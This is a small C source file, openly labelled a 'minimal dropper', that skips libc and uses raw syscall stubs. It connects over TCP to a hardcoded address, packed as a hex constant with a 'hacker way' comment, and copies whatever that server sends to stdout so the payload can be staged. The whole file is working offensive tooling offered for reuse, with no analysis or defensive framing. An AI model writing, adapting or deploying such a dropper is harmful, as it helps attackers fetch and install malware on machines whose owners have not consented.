/*
 *  nwget1. Minimal dropper in C without libc
 *  Copyright (c) 2020 pico (@0x00pico at twitter)
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
#define BUF_SIZE 1024

/* Prototypes */
// ssize_t read(int fd, void *buf, size_t count);
// ssize_t write(int fd, const void *buf, size_t count);
int  _read (int fd, void *buf, int count);
int  _write (int fd, const void *buf, int count);
int  _socket(int domain, int type, int protocol);

// int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
int  _connect(int sockfd, long *addr, int addrlen);
void _exit(int status);

int _close(int fd);

// Defines
#define PF_INET        2
#define SOCK_STREAM    1
#define IPPROTO_TCP    6


int
_start (int argc, char **argv)
{
  int                s, l;
  unsigned long      addr = 0x0100007f11110002; // Define IP the hacker way :)
  unsigned char      buf[BUF_SIZE];

  
  if ((s = _socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) return -2;
  if (_connect (s, &addr, 16) < 0) {return -3;}
  while (1)
    {
      if ((l = _read (s, buf, BUF_SIZE) ) <= 0) break;

      _write (1, buf, l);
      if (l < BUF_SIZE) break;
    }
  _close (s);
  _exit(0);
  return 0;
    
}
